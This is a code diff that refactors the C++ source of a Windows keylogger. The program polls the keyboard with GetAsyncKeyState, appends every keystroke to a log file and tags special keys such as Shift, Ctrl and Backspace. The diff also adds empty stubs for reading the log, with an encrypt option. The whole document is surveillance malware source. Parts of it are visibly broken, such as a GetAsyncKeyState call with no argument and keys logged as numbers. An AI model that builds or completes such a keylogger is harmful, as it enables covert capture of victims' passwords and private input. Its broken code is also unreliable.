@@ -1,57 +1,54 @@
-#include <keylogger.h>
+#include "keylogger.h"
 
-void Keylogger::Logger() {
+void Keylogger::logToFile(const std::string key) {
+      logFile.open(fileName, std::fstream::out | std::fstream::app);
+      logFile << key;
+}
+
+void Keylogger::asciiInput() {
     while(execute) {
-        Sleep(10);
+        for(char key = 8; key <= 190; ++key)
+            if(GetAsyncKeyState() == -32767 && !actionInput(key))
+                logToFile(std::to_string(key));
 
-        for(char key = 8; key <= 190; ++key) {
-            if(GetAsyncKeyState() == -32767 && !actionKey(key)) {
-                file.open(fileName, fstream::app);
-                file << key;
-            }
-        }
+        Sleep(10);
     }
 
-    file.close();
+    logFile.close();
 }
 
-void Keylogger::writeToLog(const char key) {
-      file.open(fileName, fstream::app);
-      file << key;
-}
-
-void actionKey(const char key) {
+bool Keylogger::actionInput(const char key) {
     switch(key) {
         case VK_SPACE:
-            writeToLog(" ");
+            logToFile(" ");
             break;
 
         case VK_RETURN:
-            writeToLog("\n");
+            logToFile("\n");
             break;
 
         case VK_TAB:
-            writeToLog("\t");
+            logToFile("\t");
             break;
 
         case VK_DELETE:
-            writeToLog("[DEL]");
+            logToFile("[DEL]");
             break;
 
         case VK_BACK:
-            writeToLog("[BACK]");
+            logToFile("[BACK]");
             break;
 
         case VK_SHIFT:
-            writeToLog("[SHIFT]");
+            logToFile("[SHIFT]");
             break;
 
         case VK_CONTROL:
-            writeToLog("[CTRL]");
+            logToFile("[CTRL]");
             break;
 
         case VK_MENU:
-            writeToLog("[ALT]");
+            logToFile("[ALT]");
             break;
 
         default:
@@ -60,4 +57,12 @@ void actionKey(const char key) {
     }
 
     return true;
+}
+
+std::fstream Keylogger::getRawFile(const std::string _fileName, bool encrypt) {
+
+}
+
+std::fstream Keylogger::getEditedFile(const std::string _fileName, bool encrypt) {
+
 }
